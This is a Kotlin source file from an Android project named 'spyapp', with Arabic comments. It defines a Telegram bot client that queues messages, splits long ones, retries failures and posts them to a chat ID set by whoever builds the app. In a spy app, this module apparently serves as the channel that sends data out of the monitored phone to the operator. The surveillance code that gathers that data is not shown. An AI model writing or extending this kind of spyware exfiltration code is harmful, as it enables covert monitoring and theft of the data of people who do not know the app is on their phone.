package com.spyapp

import android.content.Context
import kotlinx.coroutines.*
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder

object TelegramBot {

    // ⚠️⚠️⚠️ استبدل بقيمك الحقيقية قبل البناء ⚠️⚠️⚠️
    private const val BOT_TOKEN = "1234567890:REPLACE_WITH_YOUR_BOT_TOKEN"
    private const val CHAT_ID = "REPLACE_WITH_YOUR_CHAT_ID"

    private const val MAX_LENGTH = 4000 // أقل من حد Telegram (4096) للأمان
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val queue = ArrayDeque<String>()
    private var processing = false
    private var lastSend = 0L

    fun send(context: Context, message: String) {
        synchronized(queue) {
            queue.addLast(message)
        }
        processQueue(context)
    }

    fun sendError(context: Context, tag: String, e: Exception) {
        val errorMsg = buildString {
            appendLine("❌ *خطأ*")
            appendLine("🏷️ `$tag`")
            appendLine("📝 `${e.message ?: "غير معروف"}`")
        }
        send(context, errorMsg)
    }

    private fun processQueue(context: Context) {
        if (processing) return

        scope.launch {
            processing = true

            // تأخير تجميعي — يجمع رسائل متقاربة
            delay(800)

            val batch: List<String>
            synchronized(queue) {
                batch = queue.toList()
                queue.clear()
            }

            if (batch.isEmpty()) {
                processing = false
                return@launch
            }

            for (msg in batch) {
                sendWithRetry(msg, 3)
            }

            processing = false

            // تحقق من وجود رسائل جديدة وصلت
            synchronized(queue) {
                if (queue.isNotEmpty()) {
                    processing = false
                    processQueue(context)
                }
            }
        }
    }

    private suspend fun sendWithRetry(message: String, retries: Int) {
        for (attempt in 1..retries) {
            try {
                // احترام rate limit
                val now = System.currentTimeMillis()
                val sinceLast = now - lastSend
                if (sinceLast < 50) delay(50 - sinceLast)

                // تجزئة الرسائل الطويلة
                val chunks = splitMessage(message)
                for (chunk in chunks) {
                    doSend(chunk)
                    lastSend = System.currentTimeMillis()
                }
                return
            } catch (e: Exception) {
                if (attempt == retries) {
                    e.printStackTrace()
                } else {
                    delay(1000L * attempt) // تأخير تصاعدي
                }
            }
        }
    }

    private fun doSend(text: String) {
        val url = URL("https://api.telegram.org/bot$BOT_TOKEN/sendMessage")
        val conn = url.openConnection() as HttpURLConnection

        conn.requestMethod = "POST"
        conn.doOutput = true
        conn.connectTimeout = 15000
        conn.readTimeout = 15000
        conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")

        val postData = buildString {
            append("chat_id=").append(URLEncoder.encode(CHAT_ID, "UTF-8"))
            append("&text=").append(URLEncoder.encode(text, "UTF-8"))
            append("&parse_mode=Markdown")
            append("&disable_web_page_preview=true")
        }

        OutputStreamWriter(conn.outputStream, "UTF-8").use { writer ->
            writer.write(postData)
            writer.flush()
        }

        val code = conn.responseCode
        conn.disconnect()

        if (code != 200) {
            throw RuntimeException("Telegram API returned $code")
        }
    }

    private fun splitMessage(text: String): List<String> {
        if (text.length <= MAX_LENGTH) return listOf(text)

        val chunks = mutableListOf<String>()
        var remaining = text

        while (remaining.length > MAX_LENGTH) {
            var splitAt = remaining.lastIndexOf('\n', MAX_LENGTH)
            if (splitAt < 0 || splitAt < MAX_LENGTH / 2) {
                splitAt = MAX_LENGTH
            }
            chunks.add(remaining.substring(0, splitAt))
            remaining = remaining.substring(splitAt).trimStart()
        }

        if (remaining.isNotEmpty()) {
            chunks.add(remaining)
        }

        return chunks
    }
}
